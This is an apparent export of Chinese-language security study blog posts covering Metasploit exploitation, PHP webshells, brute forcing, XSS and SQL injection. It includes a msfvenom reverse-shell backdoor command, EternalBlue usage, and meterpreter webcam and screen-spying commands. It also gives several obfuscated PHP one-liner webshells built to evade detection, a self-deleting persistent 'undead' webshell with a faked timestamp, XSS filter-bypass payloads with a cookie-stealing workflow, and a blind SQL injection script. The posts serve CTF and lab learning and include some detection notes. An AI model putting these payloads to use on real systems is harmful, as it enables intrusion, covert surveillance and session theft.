<h4 id="攻击漏洞-ms17-010"><a href="#攻击漏洞-ms17-010" class="headerlink" title="攻击漏洞-ms17-010"></a>攻击漏洞-ms17-010</h4><p>1、使用模块<br><code>use exploit/windows/smb/ms17_010_eternalblue</code><br>同上。</p>
<ul>
<li>出现乱码，修改编码，chcp 65001。<h4 id="后渗透测试"><a href="#后渗透测试" class="headerlink" title="后渗透测试"></a>后渗透测试</h4>退出：backgroud<br>升级：session -u 1<h4 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h4>show exploit-查看所有可用的渗透攻击程序代码<br>show auxiliary-查看所有可用的辅助攻击工具<br>show options-查看该模块可用选项<br>show payloads-查看该模块适用的所有载荷代码<br>show targets-查看该模块适用的攻击目标类型<br>search-根据关键字搜索某模块<br>info-显示某模块的详细信息<br>use-使用某渗透攻击模块<br>back-回退<br>set/unset-设置模/禁用块中的某个参数<br>setg/unsetg-设置/禁用适用于所有模块的全局参数<br>save-将当前设置值保存下来，以便下次启动MSF终端时仍可使用。<h4 id="msfvenom"><a href="#msfvenom" class="headerlink" title="msfvenom"></a>msfvenom</h4>由msfpayload和msfencode组合<br>用于生成后门的软件，在目标机上执行后门，在本地监听上线。<h4 id="生成后门"><a href="#生成后门" class="headerlink" title="生成后门"></a>生成后门</h4><code>msfvenom -p windows/meterpreter/reverse_tcp lhost=地址 lport(未被占用的端口)  -f exe&gt;(-o)shell.exe</code><h4 id="监听"><a href="#监听" class="headerlink" title="监听"></a>监听</h4>p为payload f为格式<br>use exploit/multi/handler</li>
<li><em>详解：<code>msfvenom -p windows/meterpreter/reverse_tcp lhost=xxx lport=xxx -f exe -o xxxx.exe</code><br>可帮助我们从大量的msf有效负载中创建需要的负载，合并到利用程序中。<br>这里使用的payload要回连的主机和端口、输出格式都会整合到xxx.exe中。<br>exploit/multi/handler模块是一个有效负载处理程序，它只在受损主机中执行的有效负载连接。(类似钓鱼)<br>meterprter是msf后渗透利用工具。基于内存dll实现，能够通过创建一个新进程并调用注入的dll来让目标系统运行注入dll文件。<br>在该模式下，攻击者与目标设备中meterpreter的通信是通过stager套接字实现的。</em>*<h4 id="获取到meterpreter后能做什么？"><a href="#获取到meterpreter后能做什么？" class="headerlink" title="获取到meterpreter后能做什么？"></a>获取到meterpreter后能做什么？</h4>webcam_list:查看摄像头<br>webcam_snap:快拍<br>webcam_stream:通过摄像头开启视频</li>
</ul>
<p>screenshot:获取屏幕截图<br>screenshare:实现监控桌面<br>shutdown:关闭目标机器<br>execute:在目标机执行文件，<br>execute -iso 重装系统<br>-H 不可见 -i 交互<br>拓展：获得shell<br>使用python，<code>python2 -m SimpleHTTPServer</code><br>文件上传<br>upload /root/AUcONho0.jpeg “C:\aaa.jpeg”</p>
<h3 id="msf攻击漏洞获取目标权限"><a href="#msf攻击漏洞获取目标权限" class="headerlink" title="msf攻击漏洞获取目标权限"></a>msf攻击漏洞获取目标权限</h3><h4 id="从命令执行到meterpreter"><a href="#从命令执行到meterpreter" class="headerlink" title="从命令执行到meterpreter"></a>从命令执行到meterpreter</h4><h5 id="方法一：通过web站点，使用无文件攻击利用执行。"><a href="#方法一：通过web站点，使用无文件攻击利用执行。" class="headerlink" title="方法一：通过web站点，使用无文件攻击利用执行。"></a>方法一：通过web站点，使用无文件攻击利用执行。</h5><p>当攻击者拥有部分受害者主机的控制权，但没拿到一个完整的shell，web_delivery就派上用场。<br>目的与作用:生成一条命令，与受害者主机快速建立一条session连接，有利于绕过，支持多种脚本,需要设置脚本。<br>操作:<br><code>use exploit/multi/script/web_delivery</code><br><code>show options</code><br><code>show targets</code><br><code>set target 数字</code><br><code>set lhost</code>本机地址<br><code>set payload windows/meterpreter/reverse_tcp</code><br><code>run</code><br>复制命令，到网页提交。</p>
<h5 id="方法二：通过web，上传webshell，到完全控制"><a href="#方法二：通过web，上传webshell，到完全控制" class="headerlink" title="方法二：通过web，上传webshell，到完全控制"></a>方法二：通过web，上传webshell，到完全控制</h5><p>百度查大佬发现漏洞。<br>成功上传webshell，使用msf上线监听。</p>
<h5 id="方法三：攻击其他端口服务，拿到meterpreter-类似高级cmd"><a href="#方法三：攻击其他端口服务，拿到meterpreter-类似高级cmd" class="headerlink" title="方法三：攻击其他端口服务，拿到meterpreter(类似高级cmd)"></a>方法三：攻击其他端口服务，拿到meterpreter(类似高级cmd)</h5>]]></content>
      <tags>
        <tag>msf简单使用</tag>
      </tags>
  </entry>
  <entry>
    <title>kali</title>
    <url>/2021/04/24/kali/</url>
    <content><![CDATA[<p>   <em><strong>其实安装失败的原因很简单，安装kali需要有网络配置，没有网络无法成功安装操作系统。</strong></em></p>
<p><em><strong>我没有网络的原因是DHCP服务没开启，去虚拟机看了一下虚拟网络的设置，都是打开着DHCP服务，最后解决办法是：</strong></em></p>
<p><em><strong>到任务管理器找到vm相关网络服务，都开启即可，完成网络配置。</strong></em></p>
]]></content>
      <tags>
        <tag>kali网络配置问题</tag>
      </tags>
  </entry>
  <entry>
    <title>web</title>
    <url>/2021/02/26/web/</url>
    <content><![CDATA[<p>复习：上传木马 攻击成功必须满足三个条件：<br><strong>1、木马能成功上传到服务器<br>2、知道木马上传到服务器的路径<br>3、上传的木马能被解析执行</strong><br>eval和assert的区别：</p>
<ul>
<li><p>相同点：都能把字符串作为PHP代码执行。</p>
</li>
<li><p>不同点：eval()不能被可变函数调用。eval函数实际是一个语言构造器，相当于c语言的预定义宏，属于php语言内部关键字。<br>但是php7.1以上已经废弃了assert。</p>
<h3 id="木马变形"><a href="#木马变形" class="headerlink" title="木马变形"></a>木马变形</h3><p>传统木马防护检测一般是：基于特征检测的防护，如正则表达式和黑名单。</p>
<h3 id="隐藏关键字"><a href="#隐藏关键字" class="headerlink" title="隐藏关键字"></a>隐藏关键字</h3></li>
<li><p>绕过php代码标志&lt;?的限制<br><code>&lt;script language=&quot;php&quot;&gt;@eval($_POST[&#39;cmd&#39;]);&lt;/script&gt;</code></p>
</li>
<li><p>拆分拼接<br><code>&lt;?php $arr=explode(&quot;,&quot;,&quot;a,s,d,f,s,d,e,k,r,t&quot;); //把字符串打散为数组 $payload=$arr[0].$arr[1].$arr[4].$arr[6].$arr[8].$arr[9];//拼接成assert //php版本要求:&lt;=7.0 @$payload(@$_GET[&#39;x&#39;]); ?&gt; </code></p>
</li>
<li><p>编码<br><code>&lt;?php   $a=base64_decode(&quot;YXNzZXJ0&quot;);   @$a($_POST(&#39;cmd&#39;)); ?&gt;</code></p>
</li>
<li><p>随机异或，用异或运算来组成字符<br><code>&lt;?php //也可以用十六进制进行进一步加密,例如 //$r=&quot;x4d&quot;^&quot;x3f&quot;; $a=&quot;Y&quot;^&quot;8&quot;;//a $b=&quot;T&quot;^&quot;&#39;&quot;;//s $c=&quot;*&quot;^&quot;O&quot;;//e $d=&quot;M&quot;^&quot;?&quot;;//r $e=&quot;-&quot;^&quot;Y&quot;;//t $payload=$a.$b.$b.$c.$d.$e;//拼接成assert @$payload(@$_POST[&#39;x&#39;]); ?&gt; </code></p>
</li>
<li><p>可变函数<br><code>&lt;?php @$_REQUEST[&#39;e&#39;](@$_REQUEST[&#39;x&#39;]); //传入e=assert&amp;x=command ?&gt; </code></p>
</li>
<li><p>可变变量<br><code>&lt;?php $a=&#39;assert&#39;; $b=&#39;a&#39;; //$$b=$a=&#39;assert&#39; $$b($_POST[&#39;x&#39;]); //assert($_POST[&#39;x&#39;]) ?&gt; </code></p>
<h3 id="回调函数"><a href="#回调函数" class="headerlink" title="回调函数"></a>回调函数</h3></li>
</ul>
<p>回调函数：PHP是将函数以string形式传递的。可以使用任何内置或用户自定义函数，但除了语言结构例如：array()，echo，empty()，eval()，exit()，isset()，list()，print 或 unset()。<br>如：<br>call_user_func ( $callback , $parameter)<br>$callback ：被调用的回调函数<br>$parameter：0个或以上的参数，被传入回调函数。<br><?php  
 @call_user_func($_GET['id'],$_POST['a']);
 //传入id=eval&a=command
?></p>
<h3 id="木马使用"><a href="#木马使用" class="headerlink" title="木马使用"></a>木马使用</h3><h4 id="执行系统命令"><a href="#执行系统命令" class="headerlink" title="执行系统命令"></a>执行系统命令</h4><p>system()–执行外部程序，并显示输出<br>passthru()–执行外部程序并且显示原始输出<br>exec()–执行一个外部程序，不输出结果，echo返回结果的最后一行。<br>shell_exec()或<code>  </code>–通过shell环境执行命令，需要echo</p>
<h4 id="读文件"><a href="#读文件" class="headerlink" title="读文件"></a>读文件</h4><p>file_ get_contents 一将整个文件读入为一个字符串<br>file()一把整个文件读入一个数组中<br>readfile一读取一个文件，并写入到输出缓冲</p>
<h4 id="遍历目录"><a href="#遍历目录" class="headerlink" title="遍历目录"></a>遍历目录</h4><p>scandir() 函数返回一个指定目录中的文件和目录的数组。</p>
<h3 id="木马的特征与查杀（AWD）"><a href="#木马的特征与查杀（AWD）" class="headerlink" title="木马的特征与查杀（AWD）"></a>木马的特征与查杀（AWD）</h3><p>基于特征检测，检测敏感关键字，如：危险函数、特殊函数<br>工具：D盾</p>
<h4 id="1、代码执行函数："><a href="#1、代码执行函数：" class="headerlink" title="1、代码执行函数："></a>1、代码执行函数：</h4><ul>
<li>eval</li>
<li>assert</li>
<li>pre_replace</li>
<li>create_function</li>
<li>回调函数 call_user_func、call_user_func_array、register_tick_function、array_filter等等</li>
<li>……………….<h4 id="2、命令执行函数："><a href="#2、命令执行函数：" class="headerlink" title="2、命令执行函数："></a>2、命令执行函数：</h4></li>
<li>exec()–执行一个外部程序</li>
<li>passthru()–执行外部程序并且显示原始输出</li>
<li>proc_open()–执行一个命令，并且打开用来输入/输出的文件指针</li>
<li>shell_exec()或<code>   </code>–通过shell环境执行命令</li>
<li>system()–执行外部程序，并显示输出</li>
<li>popen()–通过参数传递一条命令，并对popen打开的文件执行<h4 id="3、文件操作函数："><a href="#3、文件操作函数：" class="headerlink" title="3、文件操作函数："></a>3、文件操作函数：</h4></li>
<li>file_ get_contents 一将整个文件读入为一个字符串</li>
<li>file_ put_ contents 一将一个字符串写入文件</li>
<li>file()一把整个文件读入一个数组中</li>
<li>fopen一打开文件或者URL</li>
<li>move_ uploaded file 一将上传的文件移动到新位置</li>
<li>readfile一读取一个文件，并写入到输出缓冲</li>
<li>rename一重命名一个文件或目录</li>
<li>rmdir一删除目录</li>
<li>unlink &amp; delete 一删除文件<h4 id="4、包含函数："><a href="#4、包含函数：" class="headerlink" title="4、包含函数："></a>4、包含函数：</h4></li>
<li>require、require_once</li>
<li>include、include_once<h4 id="5、特殊函数："><a href="#5、特殊函数：" class="headerlink" title="5、特殊函数："></a>5、特殊函数：</h4></li>
<li>phpinfo</li>
<li>变量覆盖  parse_str、extract</li>
<li>…………………<h3 id="不死马"><a href="#不死马" class="headerlink" title="不死马"></a>不死马</h3>不死马即内存马，它无文件，但程序会永久的运行在PHP进程中，无限执行，很隐蔽不易被发现，也不容易被删除。<h4 id="不死马相关代码"><a href="#不死马相关代码" class="headerlink" title="不死马相关代码"></a>不死马相关代码</h4><code>&lt;?php  ignore_user_abort(true); set_time_limit(0); unlink(__FILE__); $file = &#39;./.index1.php&#39;; $code = &#39;&lt;?php if(md5($_POST[&quot;pass&quot;])==&quot;5c44d3ed7462245f57b37f8fe2a3d5de&quot;)&#123;@eval($_POST[&quot;cmd&quot;]);&#125; ?&gt;&#39;; //pass=nepnep 用法：pass=nepnep&amp;cmd=command while (1)&#123;   file_put_contents($file,$code);   system(&#39;touch -m -d &quot;2018-12-01 09:10:12&quot; .index1.php&#39;);   usleep(5000); &#125; ?&gt;</code><br>ignore_user_abort(true)：此函数用来设置 客户机断开后是否会终止脚本的执行，设置成true，客户机断开后脚本仍然会执行。<br>set_time_limit(0)：设置脚本最大执行时间，设为0表示没有限制。<br>unlink(_<em>FILE</em>_)： 删除文件本身，起到隐蔽自身的作用。<br>usleep()：延迟执行当前脚本若干微秒。<br>注：<br>pass参数使用了MD5加密，防止木马被他人利用。</li>
</ul>
<h4 id="不死马的查杀："><a href="#不死马的查杀：" class="headerlink" title="不死马的查杀："></a>不死马的查杀：</h4><p>1、重启服务，比如php 等web服务。</p>
<p>2、创建一个和不死马同名的文件夹。</p>
<p>3、删除相应进程。查出不死马进程PID后，用命令kill -9 PID 杀掉进程。</p>
<p>4、竞争写入删除不死马的文件，usleep的时间必须要小于不死马的延迟时间才会有效。</p>
<h3 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h3><h4 id="SSRF的定义与成因"><a href="#SSRF的定义与成因" class="headerlink" title="SSRF的定义与成因"></a>SSRF的定义与成因</h4><p>SSRF(服务端请求伪造)是一种由攻击者构造形成，由服务端发起请求的一个安全漏洞。<br>一般情况下，SSRF攻击的目标是从外网无法访问的内部系统<br>(正是因为由服务端发起，所以它能够请求到与它相连而与外网隔离的内部系统)<br>原因：服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤、限制。</p>
<h4 id="SSRF的危害"><a href="#SSRF的危害" class="headerlink" title="SSRF的危害"></a>SSRF的危害</h4><ul>
<li>内网探测</li>
<li>利用file协议读取本地文件等等</li>
<li>向内部任意主机的任意端口发送精心构造的payload，从而攻击内网的web应用，主要是使用GET参数就可以实现的攻击</li>
<li>DOS攻击<h4 id="SSRF漏洞的验证"><a href="#SSRF漏洞的验证" class="headerlink" title="SSRF漏洞的验证"></a>SSRF漏洞的验证</h4>1、排除法，F12查看源码，看是否在本地进行请求<br>如：xxx?image=(地址)的就可能存在SSRF漏洞。<br>2、dnslog等工具进行测试，看是否被访问。<h4 id="绕过方法"><a href="#绕过方法" class="headerlink" title="绕过方法"></a>绕过方法</h4>1、加端口<br>2、短网址<br>3、指向任意IP的域名xip.io<br>4、IP限制绕过<br>十进制转换、八进制转换、十六进制转换<br>5、@绕过<br>访问的是@后面的网址<br>6、后面跟参数</li>
</ul>
]]></content>
      <tags>
        <tag>一句话木马</tag>
      </tags>
  </entry>
  <entry>
    <title>Weak Password Burst</title>
    <url>/2021/01/24/wepd/</url>
    <content><![CDATA[<h3 id="弱口令破解登陆目标服务器"><a href="#弱口令破解登陆目标服务器" class="headerlink" title="弱口令破解登陆目标服务器"></a>弱口令破解登陆目标服务器</h3><h4 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h4><pre><code>nmap
20:ssh 80:http
</code></pre>
<h4 id="SSH爆破之字典"><a href="#SSH爆破之字典" class="headerlink" title="SSH爆破之字典"></a>SSH爆破之字典</h4><ul>
<li>Cewl制作字典<br><code>cewl -d 2 -m 5 -w word.txt 网址</code><br>根据提供信息，随机生成一套弱口令密码,密码制作网站:<br><a href="https://bugku.com/mima/">https://bugku.com/mima/</a> <h4 id="Hydra爆破SSH"><a href="#Hydra爆破SSH" class="headerlink" title="Hydra爆破SSH"></a>Hydra爆破SSH</h4>kali自带<br>hydra -I 用户名(-L 用户名字典) -p 密码(-P word.txt) 网址 -s 端口(开放状态) ssh -f(找到一个终止)<h4 id="MSF模块爆破SSH"><a href="#MSF模块爆破SSH" class="headerlink" title="MSF模块爆破SSH"></a>MSF模块爆破SSH</h4><code>search login</code>关于登陆相关模块<br><code>use auxiliary/scanner/ssh/ssh_login</code><br><code>set rhosts 目标ip</code><br><code>set rport 端口</code><br><code>set username root</code><br><code>set pass_file/root/Desktop/word.txt</code><br><code>set threads 10</code><br><code>run</code><h4 id="Hydra爆破RDP-远程桌面协议"><a href="#Hydra爆破RDP-远程桌面协议" class="headerlink" title="Hydra爆破RDP(远程桌面协议)"></a>Hydra爆破RDP(远程桌面协议)</h4>爆破电脑解锁密码<h4 id="爆破工具"><a href="#爆破工具" class="headerlink" title="爆破工具"></a>爆破工具</h4></li>
</ul>
<p>御剑RDP爆破工具<br>超级弱口令检查工具</p>
<h4 id="burp爆破"><a href="#burp爆破" class="headerlink" title="burp爆破"></a>burp爆破</h4><p>之前就使用过很多了，补充一些不知道的功能。<br>Pitchfork(叉子模式)<br>设置几组变量，就有几组payload，请求数量是最小payload组中的payload数量。<br>Cluster bomb(炸弹模式)<br>与鱼叉类似，不过不是一一对应，而是一对多，循环搭配组合，请求数量是各payload数量的乘积。</p>
]]></content>
      <tags>
        <tag>暴力破解</tag>
      </tags>
  </entry>
  <entry>
    <title>XSS</title>
    <url>/2021/01/08/xss/</url>
    <content><![CDATA[<p><strong>XSS，全称Cross Site Scripting，即跨站脚本攻击，某种意义上是一种注入攻击，<br>是指黑客在页面中注入恶意的脚本代码，当受害者访问该页面时，恶意代码会在浏览器执行，如获取用户cookie信息。<br>需要强调的是，XSS不仅仅限制于JavaScript，还包括flash等其他脚本语言。<br>根据恶意代码是否存储在服务器中，XSS可分为存储型XSS和反射型XSS。</strong></p>
<h3 id="反射型"><a href="#反射型" class="headerlink" title="反射型"></a>反射型</h3><h4 id="low"><a href="#low" class="headerlink" title="low"></a>low</h4><p>查看源码，代码直接引用name参数，且没有进行过滤和检查，存在明显的XSS漏洞。<br>输入<code>&lt;script&gt;alert(/xss/)&lt;/script&gt;</code><br><img src="xss.md/1.png"></p>
<h4 id="medium"><a href="#medium" class="headerlink" title="medium"></a>medium</h4><p>多了str_replace函数，把<code>&lt;script&gt;</code>过滤了。<br>方法一：双写绕过。<code>&lt;sc&lt;script&gt;ript&gt;alert(/xss/)&lt;/script&gt;</code><br>方法二：大小写绕过。<code>&lt;SCRipt&gt;alert(/xss/)&lt;/script&gt;</code></p>
<h4 id="high"><a href="#high" class="headerlink" title="high"></a>high</h4><p>preg_replace() 函数用于正则表达式的搜索和替换，这使得双写绕过、大小写混淆绕过（正则表达式中i表示不区分大小写）不再有效。<br>正则表达式很强大。<br><code>&lt;img src=1 onerror=alert(/xss/)&gt;</code><br>所以这里无法通过<code>&lt;script&gt;</code>标签注入XSS代码了，但是可以找img，body等标签的事件或者iframe等标签的src注入恶意的js代码。</p>
<h3 id="存储型"><a href="#存储型" class="headerlink" title="存储型"></a>存储型</h3><h4 id="low-1"><a href="#low-1" class="headerlink" title="low"></a>low</h4><p>了解三个函数，有的是之前见过了，再复习一下。<br>trim(string,charlist)<br>函数移除字符串两侧的空白字符或其他预定字符，如\t,\n,\x0B\r以及空格，可选参数charlist支持添加额外需要删除的字符。<br>mysql_real_escape_string(string,connection)函数会对字符串中的特殊符号(\x00,\n,\r,’,”,\x1a)进行转义。<br>stripslashes(string)<br>函数删除字符串中的反斜杠。<br>这里没有对XXS方面进行过滤和检查，且存储在数据库中，明显存在存储型XSS漏洞。<br>方法一：尝试在name端输入，有字数限制，可以抓包修改上传。<br>方法二：直接在message内输入<code>&lt;script&gt;alert(/xss/)&lt;/script&gt;</code><br>name里随便输入就行，成功出现弹窗。</p>
<h4 id="medium-1"><a href="#medium-1" class="headerlink" title="medium"></a>medium</h4><p>这里无法对message参数进行注入，message被htmlspecialchars函数进行编码，但是name只简单进行了<code>&lt;script&gt;</code>过滤，所以<br>抓包后，双写，或者大小写绕过。</p>
<h4 id="high-1"><a href="#high-1" class="headerlink" title="high"></a>high</h4><p>message还是被htmlspecialchars函数进行编码，name使用了正则表达式替换，所以可以同上面反射型方法一样，对其他标签注入。<br>抓包下来，该name参数为<code>&lt;img src=1 onerror=alert(1)&gt;</code>即可。</p>
<h3 id="dom"><a href="#dom" class="headerlink" title="dom"></a>dom</h3><h4 id="low-2"><a href="#low-2" class="headerlink" title="low"></a>low</h4><p>查看源码，php内没任何东西，可以进行任意操作。直接在payload上输入<code>&lt;script&gt;alert(/xss/)&lt;/script&gt;</code>,成功弹窗。<br><img src="xss.md/2.png"></p>
<h4 id="medium-2"><a href="#medium-2" class="headerlink" title="medium"></a>medium</h4><p>Stripos() 函数查找字符串在另一字符串中第一次出现的位置（不区分大小写）。<br>检测default值中是否有 &lt;script  ，如果有的话，则将 default=English ,就不能双写，大小写绕过了。<br>这里通过img标签注入，输入<code>&lt;img src=1 onerror=alert(1)&gt;</code>，没有出现弹窗，检查页面源代码。<br><img src="xss.md/3.png"><br>语句被插入了value，但没有插入到option，所以img标签没有起到作用，这里闭合option标签。<br>原理：<code>&lt;option value=&#39;     &quot; + lang + &quot;      &#39;&gt;  &quot;  + decodeURI(lang) +  &quot;  &lt;/option&gt;</code><br>所以构造，<code>&gt;&lt;/option&gt;&lt;img src=1 οnerrοr=alert(1)&gt; </code><br><img src="xss.md/4.png"><br>只有&gt;插入，option标签的值，因为</option>闭合了option标签，所以img标签并没有插入。<br>继续构造闭合select标签，这样img标签就是独立的一条语句。<code>&gt;&lt;/option&gt;&lt;/select&gt;&lt;img src=1 onerror=alert(1)&gt;</code><br>成功插入页面。<br>![](xss.md/5.png<br>补充：<br>基本payload：<br><code>&lt;script&gt;alert(1)&lt;/script&gt;</code><br><code>&lt;body onload=alert(1)&gt;</code><br><code>&lt;input onclick=alert(1)&gt;</code><br><code>&lt;img src=1 onerror=alert(1)&gt;</code><br><code>&lt;a href=javascript:alert(1)&gt;</code></p>
<h3 id="XSSER的使用步骤"><a href="#XSSER的使用步骤" class="headerlink" title="XSSER的使用步骤"></a>XSSER的使用步骤</h3><p>网站：<a href="https://xss.pt/xss.php?do=login">https://xss.pt/xss.php?do=login</a><br>1、登陆，创建项目，默认，keep。<br>2、拷贝代码，植入。<br>3、在XSSER框架等待受害者的Cookie。<br>4、攻击者浏览项目，便可获得受害者会话信息。<br>5、把Cookie值全部填入Cookie-editor或者使用burp修改Cookie值。</p>
]]></content>
      <tags>
        <tag>XSS</tag>
      </tags>
  </entry>
  <entry>
    <title>python</title>
    <url>/2021/01/16/python/</url>
    <content><![CDATA[<h3 id="在windows环境下运行python脚本出现中文错误的解决办法："><a href="#在windows环境下运行python脚本出现中文错误的解决办法：" class="headerlink" title="在windows环境下运行python脚本出现中文错误的解决办法："></a>在windows环境下运行python脚本出现中文错误的解决办法：</h3><p>*<strong>原因：中文windows默认的输出编码为gbk，与脚本中定义的UTF-8不一样，所以出现了解码失败的情况。</strong><br><strong>方法一：先把中文解码为utf-8然后再转化为gbk输出。</strong><br>例如：<code># -*- coding:utf-8 -*- a=&quot;你好&quot; print(a.decode(&#39;utf-8&#39;).encode(&#39;gbk&#39;))</code><br><strong>方法二：在创建一个新文件夹，把脚本放入里面，打开cmd，输入python 脚本名.py就不会出现编码错误。</strong><br>这里附上一个python盲注脚本(只有盲注数据库长度，后面的盲注也是类似的。)：<br>`#!/usr/bin/python3</p>
<p><code># -*- coding:utf-8 -*-</code><br>import requests</p>
<p>def ascii_str():#生成库名表名字符所在的字符列表字典<br>    str_list=[]<br>    for i in range(33,127):#所有可显示字符<br>        str_list.append(chr(i))<br>    print(‘可显示字符：%s’%str_list)<br>    return str_list#返回字符列表</p>
<p>def db_length(url,str):<br>    print(“[-]开始测试数据库名长度…….”)<br>    num=1<br>    while True:<br>        db_payload=url+”‘ and (length(database())=%d)–+”%num<br>        r=requests.get(db_payload)<br>        if str in r.text:<br>            db_length=num<br>            print(“[+]数据库长度：%d\n”%db_length)<br>            break<br>        else:<br>            num += 1</p>
<p><code>if __name__ == &#39;__main__&#39;:</code><br>    url=”<a href="http://localhost1/Less-5/?id=1&quot;#%E7%9B%AE%E6%A0%87url">http://localhost1/Less-5/?id=1&quot;#目标url</a><br>    str=”You are in”#布尔型盲注的true&amp;false的判断因素<br>    db_length(url,str)#程序入口`<br><img src="python.md/1.png"></p>
]]></content>
  </entry>
  <entry>
    <title>一些函数解释</title>
    <url>/2020/12/08/%E4%B8%80%E4%BA%9B%E5%87%BD%E6%95%B0%E7%9A%84%E8%A7%A3%E9%87%8A/</url>
    <content><![CDATA[<h3 id="对于concat函数理解"><a href="#对于concat函数理解" class="headerlink" title="对于concat函数理解"></a>对于concat函数理解</h3><p>concat函数是用来mysql字符串连接的。<br>如：<code>select concat(&#39;m&#39;,&#39;y&#39;,&#39;s&#39;,&#39;q&#39;,&#39;l&#39;);</code>得到mysql。<br>concat中sql语句可以执行<br><code>select concat((select username from users limit 0,1 ));</code><br><strong>sql语句记得加括号，limit 0,1因为爆出数据长度过长。</strong><br><strong>十六进制也可以直接转化</strong><br><code>select concat(0x7e,(select username from users limit 0,1)0x7e);</code><br><strong>0x7e为~符号，0x7c为| 个人更喜欢0x7c,更美观。需要添加十六进制连接符，不加得不出结果，是这个函数的特性。</strong></p>
<h3 id="updatexml函数理解"><a href="#updatexml函数理解" class="headerlink" title="updatexml函数理解"></a>updatexml函数理解</h3><pre><code>直接用updatexml执行sql语句，不行。需要连接concat，应该是updatexml第二个参数必须是字符串。
此函数可以类比extractvalue函数，同样需要连接concat。
</code></pre>
<h3 id="limit的用法"><a href="#limit的用法" class="headerlink" title="limit的用法"></a>limit的用法</h3><p>**limit 子句可以被用于强制select语句返回指定的记录数，limit，接受一个或两个参数。参数必须为一个整数常量，第一个参数是返回记录行的偏移量，初始记录行偏移量是0；<br>第二个参数指定返回记录行的最大数目。这里举例子说明吧。<br><img src="%E4%B8%80%E4%BA%9B%E5%87%BD%E6%95%B0%E7%9A%84%E8%A7%A3%E9%87%8A.md/1.png"><br>这里limit 5，6，就是检索6到11行。<br>当然只输入一个参数的也可以，limit 5相当于limit 0,5;<br><img src="%E4%B8%80%E4%BA%9B%E5%87%BD%E6%95%B0%E7%9A%84%E8%A7%A3%E9%87%8A.md/2.png"></p>
]]></content>
  </entry>
  <entry>
    <title>博客优化</title>
    <url>/2020/11/06/%E5%8D%9A%E5%AE%A2%E7%BE%8E%E5%8C%96/</url>
    <content><![CDATA[<h4 id="博客主题"><a href="#博客主题" class="headerlink" title="博客主题"></a>博客主题</h4><p>—第一步：git clone <a href="https://github.com/theme-next/hexo-theme-next">https://github.com/theme-next/hexo-theme-next</a> themes/next 运行下载主题</p>
<p>—第二步：打开设置站点的_config.yml(注意区分站点和主题文件位置)，找到theme，改成theme：next；</p>
<h4 id="博客内容的编写"><a href="#博客内容的编写" class="headerlink" title="博客内容的编写"></a>博客内容的编写</h4><p>—-运行命令   hexo new page<br>       在source-_posts内找到page.md打开在记事本编辑即可</p>
<h4 id="博客网站更名、语言、作者"><a href="#博客网站更名、语言、作者" class="headerlink" title="博客网站更名、语言、作者"></a>博客网站更名、语言、作者</h4><p>—-打开_config.yml 找到 title：xxx</p>
<p>—-同样找到  language：zh-CN # 即可改为中文 </p>
<p>—-author：xxx</p>
]]></content>
  </entry>
  <entry>
    <title>PHP伪协议</title>
    <url>/2021/02/08/%E4%BC%AA%E5%8D%8F%E8%AE%AE/</url>
    <content><![CDATA[<h3 id="PHP伪协议"><a href="#PHP伪协议" class="headerlink" title="PHP伪协议"></a>PHP伪协议</h3><p><em><strong>伪协议常常用于文件包含漏洞中。在php中能够造成文件包含的函数有include、require、include_once、require_once、highlight_file、show_source、file_get_contents、fopen、file、readfile</strong></em></p>
<h4 id="php伪协议"><a href="#php伪协议" class="headerlink" title="php伪协议"></a>php伪协议</h4><p><em>介绍两个CTF中常用的两个：</em></p>
<p><strong>1、php://input</strong></p>
<p><em><strong>用于php代码执行，需要post请求提交数据。</strong></em></p>
<p><strong>2、php://filter</strong></p>
<p><em><strong>用于读取源码，<code>php://filter/read=convert.base64-encode/resource=[文件名]</code>读取文件源码（针对php文件需要base64编码）</strong></em></p>
<p>—《bugku ctf web14》</p>
<h4 id="data协议"><a href="#data协议" class="headerlink" title="data协议"></a>data协议</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?xxx=data://text/plain;base64,想要file_get_contents()函数返回的值的base64编码</span><br><span class="line">?file=data:text/plain,&lt;?php phpinfo()?&gt; </span><br></pre></td></tr></table></figure>

<h4 id="file协议"><a href="#file协议" class="headerlink" title="file协议"></a>file协议</h4><p><em><strong>file://用于访问本地文件系统</strong></em></p>
<p><em><strong>用法：file:// [文件的绝对路径和文件名]</strong></em></p>
]]></content>
      <tags>
        <tag>PHP伪协议</tag>
      </tags>
  </entry>
  <entry>
    <title>攻防学习</title>
    <url>/2021/03/22/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/</url>
    <content><![CDATA[<h3 id="view-source"><a href="#view-source" class="headerlink" title="view_source"></a>view_source</h3><p>f12查看源码就有flag。</p>
<h2 id="robots"><a href="#robots" class="headerlink" title="robots"></a>robots</h2><p>robots.txt是搜索引擎中访问网站的时候要查看的第一个文件。<br>当一个搜索蜘蛛访问一个站点时，它会首先检查该站点根目录下是否存在robots.txt，如果存在，搜索机器人就会按照该文件中的内容来确定访问的范围；<br>如果该文件不存在，所有的搜索蜘蛛将能够访问网站上所有没有被口令保护的页面。<br>扫目录脚本dirsearch(项目地址：<a href="https://github.com/maurosoria/dirsearch">https://github.com/maurosoria/dirsearch</a>)<br>还有要用python3以上的版本。</p>
<p><img src="%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C.md/1.png"></p>
<p>不用一分钟，就发现了一个robot.txt文件，访问，获得flag路径，再次访问，获得flag。</p>
<h2 id="backup"><a href="#backup" class="headerlink" title="backup"></a>backup</h2><p>常见的备份文件后缀名有: .git .svn .swp .svn .~ .bak .bash_history<br>用扫目录脚本(同robots题目)，发现有备份文件即可找回。</p>
<h3 id="cookie"><a href="#cookie" class="headerlink" title="cookie"></a>cookie</h3><p>刷新页面，发现有一个cookie.php，访问，查看http 响应就有flag。</p>
<h2 id="disabled-button"><a href="#disabled-button" class="headerlink" title="disabled_button"></a>disabled_button</h2><p>初步了解前端知识，f12审查元素，删除字段disabled=””即可，绕过前端验证和upload第一关的方法类似。</p>
<h3 id="weak-auth"><a href="#weak-auth" class="headerlink" title="weak_auth"></a>weak_auth</h3><p>弱口令密码爆破，使用burp进行爆破即可。</p>
<h3 id="simple-php"><a href="#simple-php" class="headerlink" title="simple_php"></a>simple_php</h3><p>原理—php弱类型比较</p>
<p>审计代码，发现flag由flag1和flag2组成，先对第一个if语句分析，</p>
